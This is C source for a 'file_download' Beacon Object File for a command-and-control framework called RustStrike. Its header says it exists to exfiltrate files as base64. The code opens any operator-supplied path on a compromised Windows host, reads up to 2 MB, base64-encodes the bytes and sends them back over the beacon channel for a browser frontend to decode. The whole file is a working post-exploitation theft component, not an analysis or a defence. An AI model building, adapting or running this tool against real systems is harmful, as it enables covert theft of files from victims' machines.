/*
 * file_download BOF for RustStrike — exfiltrate a file as base64 (component format).
 *
 *   args: encodeBeaconString(path) — [2-byte LE length][UTF-8 path][null]
 *         as produced by FileBrowser.vue's downloadFile().
 *
 * Drives FileBrowser.vue. Output:
 *   === FILE: <path> ===\r\n
 *   <base64 of file bytes>
 * The frontend strips the first line if it starts with "=== FILE:" and
 * base64-decodes the rest into a Blob, triggering a browser download.
 *
 * Capped at 2 MB so the base64 fits the core's ~4 MB line buffer (same cap as
 * download.c). Binary-safe: output goes through BeaconOutput with an explicit
 * length. The base64 encoder is copied from download.c.
 *
 * Build (mingw):
 *   gcc -c examples/file_download.c -o examples/file_download.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define MAX_FILE  (2 * 1024 * 1024)   /* 2 MB cap */
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* base64-encode `len` bytes of `src` into `dst`; returns chars written. */
static int b64encode(const unsigned char *src, int len, char *dst) {
    int o = 0, i = 0;
    for (; i + 2 < len; i += 3) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8) | src[i+2];
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = B64[v & 63];
    }
    int rem = len - i;
    if (rem == 1) {
        unsigned v = src[i] << 16;
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = '=';
        dst[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8);
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = '=';
    }
    return o;
}

/* Parse the frontend's encodeBeaconString framing (2-byte LE len + bytes + NUL).
 * Falls back to raw text if the framing looks bogus. NUL-terminates out. */
static int read_bstr(char *args, int alen, int *off, char *out, int outcap) {
    if (alen < 2 || *off + 2 > alen) {
        int n = alen < outcap - 1 ? alen : outcap - 1;
        for (int i = 0; i < n; i++) out[i] = args[i];
        out[n] = 0;
        *off = alen;
        return n;
    }
    int len = (unsigned char)args[*off] | ((unsigned char)args[*off + 1] << 8);
    if (len <= 0 || len > alen - (*off + 2) + 1) {
        int n = alen < outcap - 1 ? alen : outcap - 1;
        for (int i = 0; i < n; i++) out[i] = args[i];
        out[n] = 0;
        *off = alen;
        return n;
    }
    *off += 2;
    int n = len < outcap - 1 ? len : outcap - 1;
    for (int i = 0; i < n; i++) out[i] = args[*off + i];
    out[n] = 0;
    if (n > 0 && out[n - 1] == 0) out[--n] = 0;
    *off += len;
    return n;
}

void go(char *args, int alen) {
    if (alen <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: no path specified"); return; }

    char path[MAX_PATH];
    int off = 0;
    int plen = read_bstr(args, alen, &off, path, (int)sizeof(path));
    while (plen > 0 && (path[plen-1] == '\r' || path[plen-1] == '\n')) path[--plen] = 0;
    if (plen <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: no path specified"); return; }

    HANDLE h = KERNEL32$CreateFileA(path, 0x80000000 /*GENERIC_READ*/, 1 /*FILE_SHARE_READ*/,
        NULL, 3 /*OPEN_EXISTING*/, 0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "file_download: cannot open %s (%lu)", path, KERNEL32$GetLastError());
        return;
    }

    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *raw = (unsigned char *) KERNEL32$HeapAlloc(heap, 0, MAX_FILE);
    if (!raw) { KERNEL32$CloseHandle(h); BeaconPrintf(CALLBACK_ERROR, "file_download: out of memory"); return; }
    DWORD total = 0, got = 0;
    while (total < MAX_FILE) {
        DWORD want = MAX_FILE - total > 65536 ? 65536 : MAX_FILE - total;
        if (!KERNEL32$ReadFile(h, raw + total, want, &got, NULL) || got == 0) break;
        total += got;
    }
    KERNEL32$CloseHandle(h);

    /* b64 buffer: 4/3 of raw + header + NUL. */
    int b64cap = (total / 3 + 1) * 4 + 4096;
    char *out = (char *) KERNEL32$HeapAlloc(heap, 0, b64cap);
    if (!out) { KERNEL32$HeapFree(heap, 0, raw); BeaconPrintf(CALLBACK_ERROR, "file_download: out of memory"); return; }
    /* Header line — the frontend strips it when it starts with "=== FILE:".
     * Include the path and byte count for the operator log. */
    int o = MSVCRT$_snprintf(out, b64cap - 1, "=== FILE: %s (%lu bytes%s) ===\r\n",
        path, total, total >= MAX_FILE ? " truncated" : "");
    o += b64encode(raw, total, out + o);
    out[o++] = '\r';
    out[o++] = '\n';
    out[o] = 0;

    BeaconOutput(CALLBACK_OUTPUT, out, o);

    KERNEL32$HeapFree(heap, 0, out);
    KERNEL32$HeapFree(heap, 0, raw);
}
